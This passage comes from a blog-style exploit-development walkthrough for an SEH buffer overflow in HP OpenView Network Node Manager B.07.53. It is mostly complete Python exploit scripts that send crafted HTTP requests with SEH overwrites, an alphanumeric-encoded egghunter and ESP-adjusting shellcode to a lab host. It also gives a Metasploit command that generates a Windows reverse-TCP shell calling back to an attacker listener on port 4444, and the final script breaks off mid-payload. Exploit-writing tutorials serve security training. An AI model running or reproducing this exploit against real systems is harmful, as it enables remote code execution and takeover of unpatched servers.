</span><span class='line'>
</span><span class='line'><span class="c"># 1035FE34   4C               DEC ESP</span>
</span><span class='line'><span class="c"># 1035FE35   4C               DEC ESP</span>
</span><span class='line'><span class="c"># 1035FE36   77 04            JA SHORT 1035FE59</span>
</span><span class='line'><span class="c"># little edian format: &quot;\x4c\x4c\x77\x04&quot;  ==&gt; bad char friendly</span>
</span><span class='line'><span class="n">nseh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x4c\x4c\x77\x04</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP OpenView\jre\jreActive\bin\client\jvm.dll)</span>
</span><span class='line'><span class="n">seh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x4a\x39\x6e\x6d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># setting up ESP dynamically bypassing ASLR protection</span>
</span><span class='line'><span class="c"># 2216FDF0   58               POP EAX</span>
</span><span class='line'><span class="c"># 2216FDF8   66:05 2C01       ADD AX,12C</span>
</span><span class='line'><span class="c"># 2216FDF6   50               PUSH EAX</span>
</span><span class='line'><span class="c"># 2216FDF7   5C               POP ESP</span>
</span><span class='line'>
</span><span class='line'><span class="n">espSetUp</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x58\x66\x05\x2c\x01\x50\x5c</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">alphaNumEncoding</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x5d\x55\x5d\x2d\x2d\x5d\x55\x5d\x2d\x31\x5e\x55\x5d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x2c\x5c\x6f\x2d\x70\x2c\x5c\x6f\x2d\x71\x31\x5d\x71\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x38\x26\x57\x2d\x45\x38\x26\x57\x2d\x46\x38\x28\x57\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5b\x6c\x37\x45\x2d\x5b\x6c\x37\x45\x2d\x5b\x6e\x3c\x45\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x53\x37\x2d\x2d\x41\x53\x37\x2d\x2d\x42\x54\x37\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x37\x66\x45\x2d\x54\x37\x66\x45\x2d\x56\x39\x66\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x3e\x39\x31\x2d\x50\x3e\x39\x31\x2d\x51\x41\x3b\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x2a\x67\x55\x2d\x33\x2a\x67\x55\x2d\x34\x2a\x67\x55\x50</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Replaced the &quot;D&quot; buffer with &quot;A&quot; buffer to protect from ESP corruption</span>
</span><span class='line'><span class="n">buff_last</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff_initial</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nseh</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">seh</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">espSetUp</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">alphaNumEncoding</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff_initial</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">espSetUp</span> <span class="o">+</span> <span class="n">alphaNumEncoding</span> <span class="o">+</span> <span class="n">buff_last</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">crash</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>While executing first <code>PUSH EAX</code>, it decoded and wrote the last <code>4 bytes</code> of original egg hunter at the address pointed by <code>ESP</code>.</p>

<p>For every <code>PUSH</code> instruction, <code>ESP</code> shifted <code>4 bytes</code> toward low memory.</p>

<p>Finally it reached at the beginning of the expanded egghunter after <code>8th PUSH</code>.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/begining_of_egghunter.png" alt="begining_of_egghunter" /></p>

<p>When the egghunter code run, it found the egg - <code>T00WT00W</code> and passed the execution control.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/found_egg.png" alt="found_egg" /></p>

<h2>Code cave</h2>

<blockquote><p>If we place another large buffer at the end of HTTP request as <code>POST</code> data then would it affect the entire crash?</p></blockquote>

<p>To examine that scenario, created msfpattern of 1500 bytes and sent this new buffer as POST data.</p>

<ul>
<li><code>!mona pattern_create 1500</code></li>
</ul>


<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v8.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: finding the right place for final payload</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'><span class="c"># nSEH offset = 3305, SEH offset = 3309</span>
</span><span class='line'><span class="n">total_len</span> <span class="o">=</span> <span class="mi">3780</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_initial</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">3305</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 1035FE34   4C               DEC ESP</span>
</span><span class='line'><span class="c"># 1035FE35   4C               DEC ESP</span>
</span><span class='line'><span class="c"># 1035FE36   77 04            JA SHORT 1035FE59</span>
</span><span class='line'><span class="c"># little edian format: &quot;\x4c\x4c\x77\x04&quot;  ==&gt; bad char friendly</span>
</span><span class='line'><span class="n">nseh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x4c\x4c\x77\x04</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP OpenView\jre\jreActive\bin\client\jvm.dll)</span>
</span><span class='line'><span class="n">seh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x4a\x39\x6e\x6d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_last</span> <span class="o">=</span> <span class="s">&quot;D&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff_initial</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nseh</span><span class="p">)</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">seh</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff_initial</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">buff_last</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Generate msf pattern of 1500 bytes</span>
</span><span class='line'><span class="n">testbuff</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x41\x61\x30\x41\x61\x31\x41\x61\x32\x41\x61\x33\x41\x61\x34\x41\x61\x35\x41\x61\x36\x41\x61\x37\x41\x61\x38\x41\x61\x39\x41\x62\x30\x41\x62\x31\x41\x62\x32\x41\x62\x33\x41\x62\x34\x41\x62\x35\x41\x62\x36\x41\x62\x37\x41\x62\x38\x41\x62\x39\x41\x63\x30\x41\x63\x31\x41\x63\x32\x41\x63\x33\x41\x63\x34\x41\x63\x35\x41\x63\x36\x41\x63\x37\x41\x63\x38\x41\x63\x39\x41\x64\x30\x41\x64\x31\x41\x64\x32\x41\x64\x33\x41\x64\x34\x41\x64\x35\x41\x64\x36\x41\x64\x37\x41\x64\x38\x41\x64\x39\x41\x65\x30\x41\x65\x31\x41\x65\x32\x41\x65\x33\x41\x65\x34\x41\x65\x35\x41\x65\x36\x41\x65\x37\x41\x65\x38\x41\x65\x39\x41\x66\x30\x41\x66\x31\x41\x66\x32\x41\x66\x33\x41\x66\x34\x41\x66\x35\x41\x66\x36\x41\x66\x37\x41\x66\x38\x41\x66\x39\x41\x67\x30\x41\x67\x31\x41\x67\x32\x41\x67\x33\x41\x67\x34\x41\x67\x35\x41\x67\x36\x41\x67\x37\x41\x67\x38\x41\x67\x39\x41\x68\x30\x41\x68\x31\x41\x68\x32\x41\x68\x33\x41\x68\x34\x41\x68\x35\x41\x68\x36\x41\x68\x37\x41\x68\x38\x41\x68\x39\x41\x69\x30\x41\x69\x31\x41\x69\x32\x41\x69\x33\x41\x69\x34\x41\x69\x35\x41\x69\x36\x41\x69\x37\x41\x69\x38\x41\x69\x39\x41\x6a\x30\x41\x6a\x31\x41\x6a\x32\x41\x6a\x33\x41\x6a\x34\x41\x6a\x35\x41\x6a\x36\x41\x6a\x37\x41\x6a\x38\x41\x6a\x39\x41\x6b\x30\x41\x6b\x31\x41\x6b\x32\x41\x6b\x33\x41\x6b\x34\x41\x6b\x35\x41\x6b\x36\x41\x6b\x37\x41\x6b\x38\x41\x6b\x39\x41\x6c\x30\x41\x6c\x31\x41\x6c\x32\x41\x6c\x33\x41\x6c\x34\x41\x6c\x35\x41\x6c\x36\x41\x6c\x37\x41\x6c\x38\x41\x6c\x39\x41\x6d\x30\x41\x6d\x31\x41\x6d\x32\x41\x6d\x33\x41\x6d\x34\x41\x6d\x35\x41\x6d\x36\x41\x6d\x37\x41\x6d\x38\x41\x6d\x39\x41\x6e\x30\x41\x6e\x31\x41\x6e\x32\x41\x6e\x33\x41\x6e\x34\x41\x6e\x35\x41\x6e\x36\x41\x6e\x37\x41\x6e\x38\x41\x6e\x39\x41\x6f\x30\x41\x6f\x31\x41\x6f\x32\x41\x6f\x33\x41\x6f\x34\x41\x6f\x35\x41\x6f\x36\x41\x6f\x37\x41\x6f\x38\x41\x6f\x39\x41\x70\x30\x41\x70\x31\x41\x70\x32\x41\x70\x33\x41\x70\x34\x41\x70\x35\x41\x70\x36\x41\x70\x37\x41\x70\x38\x41\x70\x39\x41\x71\x30\x41\x71\x31\x41\x71\x32\x41\x71\x33\x41\x71\x34\x41\x71\x35\x41\x71\x36\x41\x71\x37\x41\x71\x38\x41\x71\x39\x41\x72\x30\x41\x72\x31\x41\x72\x32\x41\x72\x33\x41\x72\x34\x41\x72\x35\x41\x72\x36\x41\x72\x37\x41\x72\x38\x41\x72\x39\x41\x73\x30\x41\x73\x31\x41\x73\x32\x41\x73\x33\x41\x73\x34\x41\x73\x35\x41\x73\x36\x41\x73\x37\x41\x73\x38\x41\x73\x39\x41\x74\x30\x41\x74\x31\x41\x74\x32\x41\x74\x33\x41\x74\x34\x41\x74\x35\x41\x74\x36\x41\x74\x37\x41\x74\x38\x41\x74\x39\x41\x75\x30\x41\x75\x31\x41\x75\x32\x41\x75\x33\x41\x75\x34\x41\x75\x35\x41\x75\x36\x41\x75\x37\x41\x75\x38\x41\x75\x39\x41\x76\x30\x41\x76\x31\x41\x76\x32\x41\x76\x33\x41\x76\x34\x41\x76\x35\x41\x76\x36\x41\x76\x37\x41\x76\x38\x41\x76\x39\x41\x77\x30\x41\x77\x31\x41\x77\x32\x41\x77\x33\x41\x77\x34\x41\x77\x35\x41\x77\x36\x41\x77\x37\x41\x77\x38\x41\x77\x39\x41\x78\x30\x41\x78\x31\x41\x78\x32\x41\x78\x33\x41\x78\x34\x41\x78\x35\x41\x78\x36\x41\x78\x37\x41\x78\x38\x41\x78\x39\x41\x79\x30\x41\x79\x31\x41\x79\x32\x41\x79\x33\x41\x79\x34\x41\x79\x35\x41\x79\x36\x41\x79\x37\x41\x79\x38\x41\x79\x39\x41\x7a\x30\x41\x7a\x31\x41\x7a\x32\x41\x7a\x33\x41\x7a\x34\x41\x7a\x35\x41\x7a\x36\x41\x7a\x37\x41\x7a\x38\x41\x7a\x39\x42\x61\x30\x42\x61\x31\x42\x61\x32\x42\x61\x33\x42\x61\x34\x42\x61\x35\x42\x61\x36\x42\x61\x37\x42\x61\x38\x42\x61\x39\x42\x62\x30\x42\x62\x31\x42\x62\x32\x42\x62\x33\x42\x62\x34\x42\x62\x35\x42\x62\x36\x42\x62\x37\x42\x62\x38\x42\x62\x39\x42\x63\x30\x42\x63\x31\x42\x63\x32\x42\x63\x33\x42\x63\x34\x42\x63\x35\x42\x63\x36\x42\x63\x37\x42\x63\x38\x42\x63\x39\x42\x64\x30\x42\x64\x31\x42\x64\x32\x42\x64\x33\x42\x64\x34\x42\x64\x35\x42\x64\x36\x42\x64\x37\x42\x64\x38\x42\x64\x39\x42\x65\x30\x42\x65\x31\x42\x65\x32\x42\x65\x33\x42\x65\x34\x42\x65\x35\x42\x65\x36\x42\x65\x37\x42\x65\x38\x42\x65\x39\x42\x66\x30\x42\x66\x31\x42\x66\x32\x42\x66\x33\x42\x66\x34\x42\x66\x35\x42\x66\x36\x42\x66\x37\x42\x66\x38\x42\x66\x39\x42\x67\x30\x42\x67\x31\x42\x67\x32\x42\x67\x33\x42\x67\x34\x42\x67\x35\x42\x67\x36\x42\x67\x37\x42\x67\x38\x42\x67\x39\x42\x68\x30\x42\x68\x31\x42\x68\x32\x42\x68\x33\x42\x68\x34\x42\x68\x35\x42\x68\x36\x42\x68\x37\x42\x68\x38\x42\x68\x39\x42\x69\x30\x42\x69\x31\x42\x69\x32\x42\x69\x33\x42\x69\x34\x42\x69\x35\x42\x69\x36\x42\x69\x37\x42\x69\x38\x42\x69\x39\x42\x6a\x30\x42\x6a\x31\x42\x6a\x32\x42\x6a\x33\x42\x6a\x34\x42\x6a\x35\x42\x6a\x36\x42\x6a\x37\x42\x6a\x38\x42\x6a\x39\x42\x6b\x30\x42\x6b\x31\x42\x6b\x32\x42\x6b\x33\x42\x6b\x34\x42\x6b\x35\x42\x6b\x36\x42\x6b\x37\x42\x6b\x38\x42\x6b\x39\x42\x6c\x30\x42\x6c\x31\x42\x6c\x32\x42\x6c\x33\x42\x6c\x34\x42\x6c\x35\x42\x6c\x36\x42\x6c\x37\x42\x6c\x38\x42\x6c\x39\x42\x6d\x30\x42\x6d\x31\x42\x6d\x32\x42\x6d\x33\x42\x6d\x34\x42\x6d\x35\x42\x6d\x36\x42\x6d\x37\x42\x6d\x38\x42\x6d\x39\x42\x6e\x30\x42\x6e\x31\x42\x6e\x32\x42\x6e\x33\x42\x6e\x34\x42\x6e\x35\x42\x6e\x36\x42\x6e\x37\x42\x6e\x38\x42\x6e\x39\x42\x6f\x30\x42\x6f\x31\x42\x6f\x32\x42\x6f\x33\x42\x6f\x34\x42\x6f\x35\x42\x6f\x36\x42\x6f\x37\x42\x6f\x38\x42\x6f\x39\x42\x70\x30\x42\x70\x31\x42\x70\x32\x42\x70\x33\x42\x70\x34\x42\x70\x35\x42\x70\x36\x42\x70\x37\x42\x70\x38\x42\x70\x39\x42\x71\x30\x42\x71\x31\x42\x71\x32\x42\x71\x33\x42\x71\x34\x42\x71\x35\x42\x71\x36\x42\x71\x37\x42\x71\x38\x42\x71\x39\x42\x72\x30\x42\x72\x31\x42\x72\x32\x42\x72\x33\x42\x72\x34\x42\x72\x35\x42\x72\x36\x42\x72\x37\x42\x72\x38\x42\x72\x39\x42\x73\x30\x42\x73\x31\x42\x73\x32\x42\x73\x33\x42\x73\x34\x42\x73\x35\x42\x73\x36\x42\x73\x37\x42\x73\x38\x42\x73\x39\x42\x74\x30\x42\x74\x31\x42\x74\x32\x42\x74\x33\x42\x74\x34\x42\x74\x35\x42\x74\x36\x42\x74\x37\x42\x74\x38\x42\x74\x39\x42\x75\x30\x42\x75\x31\x42\x75\x32\x42\x75\x33\x42\x75\x34\x42\x75\x35\x42\x75\x36\x42\x75\x37\x42\x75\x38\x42\x75\x39\x42\x76\x30\x42\x76\x31\x42\x76\x32\x42\x76\x33\x42\x76\x34\x42\x76\x35\x42\x76\x36\x42\x76\x37\x42\x76\x38\x42\x76\x39\x42\x77\x30\x42\x77\x31\x42\x77\x32\x42\x77\x33\x42\x77\x34\x42\x77\x35\x42\x77\x36\x42\x77\x37\x42\x77\x38\x42\x77\x39\x42\x78\x30\x42\x78\x31\x42\x78\x32\x42\x78\x33\x42\x78\x34\x42\x78\x35\x42\x78\x36\x42\x78\x37\x42\x78\x38\x42\x78\x39</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># place the testbuff as POST data</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">testbuff</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">crash</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>During crash, <code>!mona suggest</code> found the cyclic pattern at <code>0x04df6fd1</code>.</p>

<p>But the original buffer was reduced into <code>139 bytes</code>. That length was too less to accommodate a reverse shell payload. It seems application puts a limit on the length of <code>HTTP POST</code> data.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/postdata-pattern.png" alt="post data pattern found" /></p>

<p>Due to this, place the final reverse shell payload at the beginning of the input buffer with <code>encoded form</code>.</p>

<h2>Preparing final payload</h2>

<p>Generated <code>314 bytes</code> reverse tcp shell payload using metasploit.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">msfpayload</span> <span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">232.149</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="n">N</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/shell_reverse_tcp_payload.png" alt="shell_reverse_tcp_payload" /></p>

<p>Encoded that payload using <a href="https://github.com/greyshell/Exploit-Dev/tree/master/alphaNumEncoder">alphaNumEncoder.py</a>. The length of the encoded version was <code>2054 bytes</code>.</p>

<p>Prepared the final buffer that would lay out in memory like below</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/stack_layout.png" alt="stack_layout" /></p>

<h2>The shell</h2>

<p>In Kali box, run <code>netcat</code> listening on port <code>4444</code>.</p>

<p>Fired up the final exploit code and got the remote shell.</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v9_stable.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: encoded reverse tcp shell payload using alphaNumEncoder </span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'><span class="c"># nSEH offset = 3305, SEH offset = 3309</span>
</span><span class='line'><span class="n">total_len</span> <span class="o">=</span> <span class="mi">3780</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Point ESP relative to program counter&#39;s present value: adding 2340 bytes to EDI (holds the same value as PC)</span>
</span><span class='line'><span class="c"># 04DD74D6   57               PUSH EDI</span>
</span><span class='line'><span class="c"># 04DD74D7   58               POP EAX</span>
</span><span class='line'><span class="c"># 04DD74EE   66:05 7E09       ADD AX,97E</span>
</span><span class='line'><span class="c"># 04DD74E7   50               PUSH EAX</span>
</span><span class='line'><span class="c"># 04DD74E8   5C               POP ESP</span>
</span><span class='line'>
</span><span class='line'><span class="n">finalPayload_esp</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x57\x58\x66\x05\x7e\x09\x50\x5c</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">rev_shell_payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span 